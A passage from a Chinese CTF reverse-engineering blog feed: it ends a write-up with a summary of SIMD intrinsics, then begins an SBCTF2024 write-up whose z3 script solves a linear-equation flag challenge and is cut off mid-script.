F(F(F(machine_code)+F(user_id)))</p></blockquote><p>那么<code>key</code>就应该等于</p><blockquote><p>F(F(machine_code)+F(user_id))</p></blockquote><p>而这一个可以通过调试手段在中间拿到</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-19%2021.55.26.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li><p>文件没有直接存放密文，而是在程序运行中生成密文进行比较</p></li><li><p>SIMD指令总结</p><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs java">__m128i <span class="hljs-title function_">_mm_loadl_epi64</span> <span class="hljs-params">(__m128i const* mem_addr)</span><br><br>加载参数低64bit到低64dit，高64bit置<span class="hljs-number">0</span><br><br><br>__m128i <span class="hljs-title function_">_mm_unpacklo_epi8</span> <span class="hljs-params">(__m128i a, __m128i b)</span><br><br>a与b每按8bit交错排布到返回值，低bit对应低bit，先a再b<br><br><br>__m128i <span class="hljs-title function_">_mm_sub_epi16</span> <span class="hljs-params">(__m128i a, __m128i b)</span><br><br>每16bit相减<br><br><br>__m128i <span class="hljs-title function_">_mm_shuffle_epi32</span> <span class="hljs-params">(__m128i a, <span class="hljs-type">int</span> imm8)</span><br><br>将__m128i 分为<span class="hljs-number">4</span> * <span class="hljs-number">32</span> bit，a0 a1 a2 a3<br><br>这<span class="hljs-number">4</span>个<span class="hljs-type">int</span>有一个位置代号：<span class="hljs-number">0x11</span> <span class="hljs-number">0x10</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span><br><br>如果imm = <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> ，则得到的__m128i则是(r0 = a3,r1=a3,r2=a3,r3=a3) <br><br><br>__m128i <span class="hljs-title function_">_mm_cmpgt_epi32</span> <span class="hljs-params">(__m128i a, __m128i b)</span><br><br>每32bit比较，若a&gt;b则相应的32bit置全F，否则置<span class="hljs-number">0</span><br><br><br>__m128i <span class="hljs-title function_">_mm_xor_si128</span> <span class="hljs-params">(__m128i a, __m128i b)</span><br><br>每bit异或<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">_mm_cvtsi128_si32</span> <span class="hljs-params">(__m128i a)</span><br><br>取低<span class="hljs-number">32</span>位赋值<br><br><br>__m128i <span class="hljs-title function_">_mm_cvtsi32_si128</span> <span class="hljs-params">(<span class="hljs-type">int</span> a)</span><br><br>将a赋值给<span class="hljs-number">0</span>：<span class="hljs-number">31</span>，<span class="hljs-number">32</span>-<span class="hljs-number">127</span>赋值<span class="hljs-number">0</span><br><br><br>__m128i <span class="hljs-title function_">_mm_srli_epi64</span> <span class="hljs-params">(__m128i a, <span class="hljs-type">int</span> imm8)</span><br><br>每<span class="hljs-number">64</span>位右移imm8，空出的位置补零<br><br><br>__m128i <span class="hljs-title function_">_mm_srli_epi32</span> <span class="hljs-params">(__m128i a, <span class="hljs-type">int</span> imm8)</span><br><br>每<span class="hljs-number">32</span>位右移imm8，空出的位置补零<br><br><br>__m128i <span class="hljs-title function_">_mm_unpackhi_epi32</span> <span class="hljs-params">(__m128i a, __m128i b)</span><br><br>取a,b的高<span class="hljs-number">64</span>位，每32bit交错排列,如：<br><br>dst[<span class="hljs-number">31</span>:<span class="hljs-number">0</span>] := src1[<span class="hljs-number">95</span>:<span class="hljs-number">64</span>]<br><br>dst[<span class="hljs-number">63</span>:<span class="hljs-number">32</span>] := src2[<span class="hljs-number">95</span>:<span class="hljs-number">64</span>]<br><br>dst[<span class="hljs-number">95</span>:<span class="hljs-number">64</span>] := src1[<span class="hljs-number">127</span>:<span class="hljs-number">96</span>]<br><br>dst[<span class="hljs-number">127</span>:<span class="hljs-number">96</span>] := src2[<span class="hljs-number">127</span>:<span class="hljs-number">96</span>]<br><br><br>__m128i <span class="hljs-title function_">_mm_srli_si128</span> <span class="hljs-params">(__m128i a, <span class="hljs-type">int</span> imm8)</span><br><br>右移<span class="hljs-number">8</span>*imm8位<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">_mm_extract_epi16</span> <span class="hljs-params">(__m128i a, <span class="hljs-type">int</span> imm8)</span><br><br>a右移imm8*16bit后取低16bit赋值给目标<span class="hljs-type">int</span>的低<span class="hljs-number">16</span>位，高<span class="hljs-number">16</span>位置零<br><br><br>dst[<span class="hljs-number">15</span>:<span class="hljs-number">0</span>] := (a[<span class="hljs-number">127</span>:<span class="hljs-number">0</span>] &gt;&gt; (imm8[<span class="hljs-number">2</span>:<span class="hljs-number">0</span>] * <span class="hljs-number">16</span>))[<span class="hljs-number">15</span>:<span class="hljs-number">0</span>]<br><br>dst[<span class="hljs-number">31</span>:<span class="hljs-number">16</span>] := <span class="hljs-number">0</span><br><br>__m128i <span class="hljs-title function_">_mm_slli_epi32</span> <span class="hljs-params">(__m128i a, <span class="hljs-type">int</span> imm8)</span><br><br>每个<span class="hljs-number">32</span>左移imm8，空余补零<br><br><br>__m128 <span class="hljs-title function_">_mm_set_ps1</span> <span class="hljs-params">(<span class="hljs-type">float</span> a)</span><br><br>将a重复拷贝到<span class="hljs-number">4</span>个<span class="hljs-number">32</span>中<br><br><br>__m128 <span class="hljs-title function_">_mm_set_ps</span> <span class="hljs-params">(<span class="hljs-type">float</span> e3, <span class="hljs-type">float</span> e2, <span class="hljs-type">float</span> e1, <span class="hljs-type">float</span> e0)</span><br><br>dst[<span class="hljs-number">31</span>:<span class="hljs-number">0</span>] := e0<br><br>dst[<span class="hljs-number">63</span>:<span class="hljs-number">32</span>] := e1<br><br>dst[<span class="hljs-number">95</span>:<span class="hljs-number">64</span>] := e2<br><br>dst[<span class="hljs-number">127</span>:<span class="hljs-number">96</span>] := e3<br><br><br>__m128 <span class="hljs-title function_">_mm_max_ps</span> <span class="hljs-params">(__m128 a, __m128 b)</span><br><br>每32bit取较大值<br><br><br>__m128 <span class="hljs-title function_">_mm_set_ss</span> <span class="hljs-params">(<span class="hljs-type">float</span> a)</span><br><br>将a赋给目标的<span class="hljs-number">0</span>:<span class="hljs-number">31</span> bit<br></code></pre></td></tr></table></figure></blockquote></li></ol>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>题目复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SBCTF2024</title>
    <link href="/2024/01/18/SBCTF2024/"/>
    <url>/2024/01/18/SBCTF2024/</url>
    
    <content type="html"><![CDATA[<p>SBCTF2024 Reverse wp</p><span id="more"></span><h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="babymath"><a href="#babymath" class="headerlink" title="babymath"></a>babymath</h2><p>z3一把梭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><br>flag = [BitVec(<span class="hljs-string">&#x27;flag_%i&#x27;</span> % i, <span class="hljs-number">7</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>)]<br><br>s = Solver()<br>s.add(flag[<span class="hljs-number">0</span>]*<span class="hljs-number">831</span>+flag[<span class="hljs-number">1</span>]*<span class="hljs-number">310</span>+flag[<span class="hljs-number">2</span>]*<span class="hljs-number">873</span>+flag[<span class="hljs-number">3</span>]*<span class="hljs-number">420</span>+flag[<span class="hljs-number">4</span>]*<span class="hljs-number">547</span>+flag[<span class="hljs-number">5</span>]*<span class="hljs-number">15</span>+flag[<span class="hljs-number">6</span>]*<span class="hljs-number">563</span>+flag[<span class="hljs-number">7</span>]*<span class="hljs-number">361</span>+flag[<span class="hljs-number">8</span>]*<span class="hljs-number">221</span>+flag[<span class="hljs-number">9</span>]*<span class="hljs-number">573</span>+flag[<span class="hljs-number">10</span>]*<span class="hljs-number">575</span>+flag[<span class="hljs-number">11</span>]*<span class="hljs-number">572</span>+flag[<span class="hljs-number">12</span>]*<span class="hljs-number">889</span>+flag[<span class="hljs-number">13</span>]*<span class="hljs-number">881</span>+flag[<span class="hljs-number">14</span>]*<span class="hljs-number">624</span>+flag[<span class="hljs-number">15</span>]*<span class="hljs-number">669</span>+flag[<span class="hljs-number">16</span>]*<span class="hljs-number">397</span>+flag[<span class="hljs-number">17</span>]*<span class="hljs-number">903</span>+flag[<span class="hljs-number">18</span>]*<span class="hljs-number">859</span>+flag[<span class="hljs-number">19</span>]*<span class="hljs-number">594</span>+flag[<span class="hljs-number">20</span>]*<span class="hljs-number">2</span>==<span class="hljs-number">1073066</span>)<br>    <br>s.add(flag[<span class="hljs-number">0</span>]*<span class="hljs-number">89</span>+flag[<span class="hljs-number">1</span>]*<span class="hljs-number">862</span>+flag[<span class="hljs-number">2</span>]*<span class="hljs-number">606</span>+flag[<span class="hljs-number">3</span>]*<span class="hljs-number">600</span>+flag[<span class="hljs-number">4</span>]*<span class="hljs-number">823</span>+flag[<span class="hljs-number">5</span>]*<span class="hljs-number">800</span>+flag[<span class="hljs-number">6</span>]*<span class="hljs-number">826</span>+flag[<span class="hljs-number">7</span>]*<span class="hljs-number">596</span>+flag[<span class="hljs-number">8</span>]*<span class="hljs-number">79</span>+flag[<span class="hljs-number">9</span>]*<span class="hljs-number">473</span>+flag[<span class="hljs-number">10</span>]*<span class="hljs-number">413</span>+flag[<span class="hljs-number">11</span>]*<span class="hljs-number">420</span>+flag[<span class="hljs-number">12</span>]*<span class="hljs-number">78</span>+flag[<span class="hljs-number">13</span>]*<span class="hljs-number">284</span>+flag[<span class="hljs-number">14</span>]*<span class="hljs-number">545</span>+flag[<span class="hljs-number">15</span>]*<span class="hljs-number">656</span>+flag[<span class="hljs-number">16</span>]*<span class="hljs-number">503</span>+flag[<span class="hljs-number">17</span>]*<span class="hljs-number">399</span>+flag[<span class="hljs-number">18</span>]*<span class="hljs-number">79</span>+flag[<span class="hljs-number">19</span>]*<span class="hljs-number">243</span>+flag[<span class="hljs-number">20</span>]*<span class="hljs-number">88</span>==<span class="hljs-number">829594</span>)<br>    <br>s.add(flag[<span class="hljs-number">0</span>]*<span class="hljs-number">619</span>+flag[<span class="hljs-number">1</span>]*<span class="hljs-number">701</span>+flag[<span class="hljs-number">2</span>]*<span class="hljs-number">128</span>+flag[<span class="hljs-number">3</span>]*<span class="hljs-number">598</span>+flag[<span class="hljs-number">4</span>]*<span class="hljs-number">572</span>+flag[<span class="hljs-number">5</span>]*<span class="hljs-number">297</span>+flag[<span class="hljs-number">6</span>]*<span class="hljs-number">852</span>+flag[<span class="hljs-number">7</span>]*<span class="hljs-number">939</span>+flag[<span class="hljs-number">8</span>]*<span class="hljs-number">295</span>+flag[<span class="hljs-number">9</span>]*<span class="hljs-number">536</span>+flag[<span class="hljs-number">10</span>]*<span class="hljs-number">362</span>+flag[<span class="hljs-number">11</span>]*<span class="hljs-number">26</span>+flag[<span class="hljs-number">12</span>]*<span class="hljs-number">597</span>+flag[<span class="hljs-number">13</span>]*<span class="hljs-number">900</span>+flag[<span class="hljs-number">14</span>]*<span class="hljs-number">605</span>+flag[<span class="hljs-number">15</span>]*<span class="hljs-number">169</span>+flag[<span class="hljs-number">16</span>]*<span class="hljs-number">78</span>+flag[<span class="hljs-number">17</span>]*<span class="hljs-number">469</span>+flag[<span class="hljs-number">18</span>]*<span class="hljs-number">1</span>+flag[<span class="hljs-number">19</span>]*<span class="hljs-number">561</span>+flag[<span class="hljs-number">20</span>]*<span class="hljs-number">387</span>==<span class="hljs-number">896243</span>)<br>    <br>s.add(flag[<span class="hljs-number">0</span>]*<span class="hljs-number">568</span>+flag[<span class="hljs-number">1</span>]*<span class="hljs-number">639</span>+flag[<span class="hljs-number">2</span>]*<span class="hljs-number">808</span>+flag[<span class="hljs-number">3</span>]*<span class="hljs-number">747</span>+flag[<span class="hljs-number">4</span>]*<span class="hljs-number">978</span>+flag[<span class="hljs-number">5</span>]*<span class="hljs-number">23</span>+flag[<span class="hljs-number">6</span>]*<span class="hljs-number">600</span>+flag[<span class="hljs-number">7</span>]*<span class="hljs-number">300</span>+flag[<span class="hljs-number">8</span>]*<span class="hljs-number">354</span>+flag[<span class="hljs-number">9</span>]*<span class="hljs-number">881</span>+flag[<span class="hljs-number">10</span>]*<span class="hljs-number">23</span>+flag[<span class="hljs-number">11</span>]*<span class="hljs-number">153</span>+flag[<span class="hljs-number">12</span>]*<span class="hljs-number">251</span>+flag[<span class="hljs-number">13</span>]*<span class="hljs-number">619</span>+flag[<span class="hljs-number">14</span>]*<span class="hljs-number">624</span>+flag[<span class="hljs-number">15</span>]*<span class="hljs-number">85</span>+flag[<span class="hljs-number">16</span>]*<span class="hljs-number">301</span>+flag[<span class="hljs-number">17</span>]*<span class="hljs-number">741</span>+flag[<span class="hljs-number">18</span>]*<span class="hljs-number">904</span>+flag[<span class="hljs-number">19</span>]*<span class="hljs-number">46</span>+flag[<span class="hljs-number">20</span>]*<span class="hljs-number">747</span>==<span class="hljs-number">936424</span>)<br>    <br>s.add(flag[<span class="hljs-number">0</span>]*<span class="hljs-number">714</span>+flag[<span class="hljs-number">1</span>]*<span class="hljs-number">276</span>+flag[<span class="hljs-number">2</span>]*<span class="hljs-number">589</span>+flag[<span class="hljs-number">3</span>]*<span class="hljs-number">743</span>+flag[<span class="hljs-number">4</span>]*<span class="hljs-number">133</span>+flag[<span class="hljs-number">5</span>]*<span class="hljs-number">205</span>+flag[<span class="hljs-number">6</span>]*<span class="hljs-number">779</span>+flag[<span class="hljs-number">7</span>]*<span class="hljs-number">675</span>+flag[<span class="hljs-number">8</span>]*<span class="hljs-number">166</span>+flag[<span class="hljs-number">9</span>]*<span class="hljs-number">271</span>+flag[<span class="hljs-number">10</span>]*<span class="hljs-number">971</span>+flag[<span class="hljs-number">11</span>]*<span class="hljs-number">679</span>+flag[<span class="hljs-number">12</span>]*<span class="hljs-number">787</span>+flag[<span class="hljs-number">13</span>]*<span class="hljs-number">894</span>+flag[<span class="hljs-number">14</span>]*<span class="hljs-number">736</span>+flag[<span class="hljs-number">15</span>]*<span class="hljs-number">537</span>+flag[<span class="hljs-number">16</span>]*<span class="hljs-number">751</span>+flag[<span class="hljs-number">17</span>]*<span class="hljs-number">84</span>+flag[<span class="hljs-number">18</span>]*<span class="hljs-number">143</span>+flag[<span class="hljs-number">19</span>]*<span class="hljs-number">242</span>+flag[<span class="hljs-number">20</span>]*<span class="hljs-number">682</span>==<span class="hljs-number">1023780</span>)<br>    <br>s.add(flag[<span class="hljs-number">0</span>]*<span class="hljs-number">113</span>+flag[<span class="hljs-number">1</span>]*<span class="hljs-number">695</span>+flag[<span class="hljs-number">2</span>]*<span class="hljs-number">514</span>+flag[<span class="hljs-number">3</span>]*<span class="hljs-number">550</span>+flag[<span class="hljs-number">4</span>]*<span class="hljs-number">895</span>+flag[<span class="hljs-number">5</span>]*<span class="hljs-number">763</span>+flag[<span class="hljs-number">6</span>]*<span class="hljs-number">175</span>+flag[<span class="hljs-number">7</span>]*<span class="hljs-number">314</span>+flag[<span class="hljs-number">8</span>]*<span class="hljs-number">98</span>+flag[<span class="hljs-number">9</span>]*<span class="hljs-number">835</span>+flag[<span class="hljs-number">10</span>]*<span class="hljs-number">161</span>+flag[<span class="hljs-number">11</span>]*<span class="hljs-number">330</span>+flag[<span class="hljs-number">12</span>]*<span class="hljs-number">119</span>+flag[<span class="hljs-number">13</span>]*<span class="hljs-number">581</span>+flag[<span class="hljs-number">14</span>]*<span class="hljs-number">109</span>+flag[<span class="hljs-number">15</span>]*<span class="hljs-number">917</span>+flag[<span class="hljs-number">16</span>]*<span class="hljs-number">764</span>+flag[<span class="hljs-number">17</span>]*<span class="hljs-number">185</span>+flag[<span class="hljs-number">18</span>]*<span class="hljs-number">556</span>+flag[<span class="hljs-number">19</span>]*<span class="hljs-number">854</span>+flag[<span class="hljs-number">20</span>]*<span class="hljs-number">937</span>==<span class="hljs-number">1018657</span>)<br>    <br>s.add(flag[<span class="hljs-number">0</span>]*<span class="hljs-number">821</span>+flag[<span class="hljs-number">1</span>]*<span class="hljs-number">513</span>+flag[<span class="hljs-number">2</span>]*<span class="hljs-number">572</span>+flag[<span class="hljs-number">3</span>]*<span class="hljs-number">799</span>+flag[<span class="hljs-number">4</span>]*<span class="hljs-number">642</span>+flag[<span class="hljs-number">5</span>]*<span class="hljs-number">164</span>+flag[<span class="hljs-number">6</span>]*<span class="hljs-number">418</span>+flag[<span class="hljs-number">7</span>]*<span class="hljs-number">639</span>+flag[<span class="hljs-number">8</span>]*<span class="hljs-number">400</span>+flag[<span class="hljs-number">9</span>]*<span class="hljs-number">467</span>+flag[<span class="hljs-number">10</span>]*<span class="hljs-number">943</span>+flag[<span class="hljs-number">11</span>]*<span class="hljs-number">715</span>+flag[<span class="hljs-number">12</span>]*<span class="hljs-number">419</span>+flag[<span class="hljs-number">13</span>]*<span class="hljs-number">978</span>+flag[<span class="hljs-number">14</span>]*<span class="hljs-number">127</span>+flag[<span class="hljs-number">15</span>]*<span class="hljs-number">618</span>+flag[<span class="hljs-number">16</span>]*<span class="hljs-number">392</span>+flag[<span class="hljs-number">17</span>]*<span class="hljs-number">867</span>+flag[<span class="hljs-number">18</span>]*<span class="hljs-number">386</span>+flag[<span class="hljs-number">19</span>]*<span class="hljs-number">760</span>+flag[<span class="hljs-number">20</span>]*<span class="hljs-number">483</span>==<span class="hljs-number">1152010</span>)<br>    <br>s.add(flag[<span class="hljs-number">0</span>]*<span class="hljs-number">50</span>+flag[<span class="hljs-number">1</span>]*<span class="hljs-number">170</span>+flag[<span class="hljs-number">2</span>]*<span class="hljs-number">348</span>+flag[<span class="hljs-number">3</span>]*<span class="hljs-number">966</span>+flag[<span class="hljs-number">4</span>]*<span class="hljs-number">744</span>+flag[<span class="hljs-number">5</span>]*<span class="hljs-number">444</span>+flag[<span class="hljs-number">6</span>]*<span class="hljs-number">341</span>+flag[<span class="hljs-number">7</span>]*<span class="hljs-number">389</span>+flag[<span class="hljs-number">8</span>]*<span class="hljs-number">12</span>+flag[<span class="hljs-number">9</span>]*<span class="hljs-number">946</span>+flag[<span class="hljs-number">10</span>]*<span class="hljs-number">723</span>+flag[<span class="hljs-number">11</span>]*<span class="hljs-number">534</span>+flag[<span class="hljs-number">12</span>]*<span class="hljs-number">498</span>+flag[<span class="hljs-number">13</span>]*<span class="hljs-number">668</span>+flag[<span class="hljs-number">14</span>]*<span class="hljs-number">201</span>+flag[<span class="hljs-number">15</span>]*<span class="hljs-number">815</span>+flag[<span class="hljs-number">16</span>]*<span class="hljs-number">921</span>+flag[<span class="hljs-number">17</span>]*<span class="hljs-number">433</span>+flag[<span class="hljs-number">18</span>]*<span class="hljs-number">128</span>+flag[<span class="hljs-number">19</span>]*<span class="hljs-number">803</span>+flag[<span class="hljs-number">20</span>]*<span class="hljs-number">879</span>==<span class="hljs-number">1067008</span>)<br>    <br>s.add(flag[<span class="hljs-number">0</span>]*<span class="hljs-number">717</span>+flag[<span class="hljs-number">1</span>]*<span class="hljs-number">133</span>+flag[<span class="hljs-number">2</span>]*<span class="hljs-number">243</span>+flag[<span class="hljs-number">3</span>]*<span class="hljs-number">425</span>+flag[<span class="hljs-number">4</span>]*<span class="hljs-number">394</span>+flag[<span class="hljs-number">5</span>]*<span class="hljs-number">4</span>+flag[<span class="hljs-number">6</span>]*<span class="hljs-number">994</span>+flag[<span class="hljs-number">7</span>]*<span class="hljs-number">34</span>+flag[<span class="hljs-number">8</span>]*<span class="hljs-number">724</span>+flag[<span class="hljs-number">9</span>]*<span class="hljs-number">949</span>+flag[<span class="hljs-number">10</span>]*<span class="hljs-number">426</span>+flag[<span class="hljs-number">11</span>]*<span class="hljs-number">908</span>+flag[<span class="hljs-number">12</span>]*<span class="hljs-number">293</span>+flag[<span class="hljs-number">13</span>]*<span class="hljs-number">962</span>+flag[<span class="hljs-number">14</span>]*<span class="hljs-number">444</span>+flag[<span class="hljs-number">15</span>]*<span class="hljs-number">808</span>+flag[<span class="hljs-number">16</span>]*<span class="hljs-number">860</span>+flag[<span class="hljs-number">17</span>]*<span class="hljs-number">988</span>+flag[<span class="hljs-number">18</span>]*<span class="hljs-number">878</span>+flag[<span class="hljs-number">19</span>]*<span class="hljs-number">424</span>+flag[<span class="hljs-number">20</span>]*<span class="hljs-number">121</span>==<span class="hljs-number">1105913</span>)<br>    <br>s.add(flag[<span class="hljs-number">0</span>]*<span class="hljs-number">536</span>+flag[<span class="hljs-number">1</span>]*<span class="hljs-number">765</span>+flag[<span class="hljs-number">2</span>]*<span class="hljs-number">835</span>+flag[<span class="hljs-number">3</span>]*<span class="hljs-number">849</span>+flag[<span class="hljs-number">4</span>]*<span class="hljs-number">838</span>+flag[<span class="hljs-number">5</span>]*<span class="hljs-number">446</span>+flag[<span class="hljs-number">6</span>]*<span class="hljs-number">520</span>+flag[<span class="hljs-number">7</span>]*<span class="hljs-number">233</span>+flag[<span class="hljs-number">8</span>]*<span class="hljs-number">392</span>+flag[<span class="hljs-number">9</span>]*<span class="hljs-number">243</span>+flag[<span class="hljs-number">10</span>]*<span class="hljs-number">598</span>+flag[<span class="hljs-number">11</span>]*<span class="hljs-number">735</span>+flag[<span class="hljs-number">12</span>]*<span class="hljs-number">926</span>+flag[<span class="hljs-number">13</span>]*<span class="hljs-number">381</span>+flag[<span class="hljs-number">14</span>]*<span class="hljs-number">366</span>+flag[<span class="hljs-number">15</span>]*<span class="hljs-number">50</span>+flag[<span class="hljs-number">16</span>]*<span class="hljs-number">252</span>+flag[<span class="hljs-number">17</span>]*<span class="hljs-number">719</span>+flag[<span class="hljs-number">18</span>]*<span class="hljs-number">796</span>+flag[<span class="hljs-number">19</span>]*<span class="hljs-number">395</span>+flag[<span class="hljs-number">20</span>]*<span class="hljs-number">928</span>==<span class="hljs-number">1112118</span>)<br>    <br>s.add(flag[<span class="hljs-number">0</span>]*<span class="hljs-number">140</span>+flag[<span class="hljs-number">1</span>]*<span class="hljs-number">859</span>+flag[<span class="hljs-number">2</span>]*<span class="hljs-number">665</span>+flag[<span class="hljs-number">3</span>]*<span class="hljs-number">768</span>+flag[<span class="hljs-number">4</span>]*<span class="hljs-number">240</span>+flag[<span class="hljs-number">5</span>]*<span class="hljs-number">845</span>+flag[<span class="hljs-number">6</span>]*<span class="hljs-number">97</span>+flag[<span class="hljs-number">7</span>]*<span class="hljs-number">822</span>+flag[<span class="hljs-number">8</span>]*<span class="hljs-number">682</span>+flag[<span class="hljs-number">9</span>]*<span class="hljs-number">958</span>+flag[<span class="hljs-number">10</span>]*<span class="hljs-number">691</span>+flag[<span class="hljs-number">11</span>]*<span class="hljs-number">778</span>+flag[<span class="hljs-number">12</span>]*<span class="hljs-number">949</span>+flag[<span class="hljs-number">13</span>]*<span class="hljs-number">125</span>+flag[<span class="hljs-number">14</span>]*<span class="hljs-number">809</span>+flag[<span class="hljs-number">15</span>]*<span class="hljs-number">466</span>+flag[<span class="hljs-number">16</span>]*<span class="hljs-number">340</span>+flag[<span class="hljs-number">17</span>]*<span class="hljs-number">353</span>+flag[<span class="hljs-number">18</span>]*<span class="hljs-number">627</span>+flag[<span class="hljs-number">19</span>]*<span class="hljs-number">728</span>+flag[<span class="hljs-number">20</span>]*<span class="hljs-number">117</span>==<span class="hljs-number">1150956</span>)<br>    <br>s.add(flag[<span class="hljs-number">0</span>]*<span class="hljs-number">858</span>+flag[<span class="hljs-number">1</span>]*<span class="hljs-number">288</span>+flag[<span class="hljs-number">2</span>]*<span class="hljs-number">297</span>+flag[<span class="hljs-number">3</span>]*<span class="hljs-number">619</span>+flag[<span class="hljs-number">4</span>]*<span class="hljs-number">462</span>+flag[<span class="hljs-number">5</span>]*<span class="hljs-number">536</span>+flag[<span class="hljs-number">6</span>]*<span class="hljs-number">646</span>+flag[<span class="hljs-number">7</span>]*<span class="hljs-number">202</span>+flag[<span class="hljs-number">8</span>]*<span class="hljs-number">298</span>+flag[<span class="hljs-number">9</span>]*<span class="hljs-number">130</span>+flag[<span class="hljs-number">10</span>]*<span class="hljs-number">491</span>+flag[<span class="hljs-number">11</span>]*<span class="hljs-number">5</span>+flag[<span class="hljs-number">12</span>]*<span class="hljs-number">855</span>+flag[<span class="hljs-number">13</span>]*<span class="hljs-number">442</span>+flag[<span class="hljs-number">14</span>]*<span class="hljs-number">535</span>+flag[<span class="hljs-number">15</span>]*<span class="hljs-number">201</span>+flag[<span class="hljs-number">16</span>]*<span class="hljs-number">67</span>+flag[<span class="hljs-number">17</span>]*<span class="hljs-number">417</span>+flag[<span class="hljs-number">18</span>]*<span class="hljs-number">789</span>+flag[<span class="hljs-number">19</span>]*<span class="hljs-number">930</span>+flag[<span class="hljs-number">20</span>]*<span class="hljs-number">939</span>==<span class="hljs-number">971309</span>)<br>    <br>s.add(flag[<span class="hljs-number">0</span>]*<span class="hljs-number">573</span>+flag[<span class="hljs-number">1</span>]*<span class="hljs-number">891</span>+flag[<span class="hljs-number">2</span>]*<span class="hljs-number">576</span>+flag[<span class="hljs-number">3</span>]*<span class="hljs-number">230</span>+flag[<span class="hljs-number">4</span>]*<span class="hljs-number">457</span>+flag[<span class="hljs-number">5</span>]*<span class="hljs-number">430</span>+flag[<span class="hljs-number">6</span>]*<span class="hljs-number">745</span>+flag[<span class="hljs-number">7</span>]*<span class="hljs-number">987</span>+flag[<span class="hljs-number">8</span>]*<span class="hljs-number">383</span>+flag[<span class="hljs-number">9</span>]*<span class="hljs-number">253</span>+flag[<span class="hljs-number">10</span>]*<span class="hljs-number">169</span>+flag[<span class="hljs-number">11</span>]*<span class="hljs-number">280</span>+flag[<span class="hljs-number">12</span>]*<span class="hljs-number">709</span>+flag[<span class="hljs-number">13</span>]*<span class="hljs-number">710</span>+flag[<span class="hljs-number">14</span>]*<span class="hljs-number">453</span>+flag[<span class="hljs-number">15</span>]*<span class="hljs-number">344</span>+flag[<span class="hljs-number">16</span>]*<span class="hljs-number">126</span>+flag[<span class="hljs-number">17</span>]*<span class="hljs-number">829</span>+flag[<span class="hljs-number">18</span>]*<span 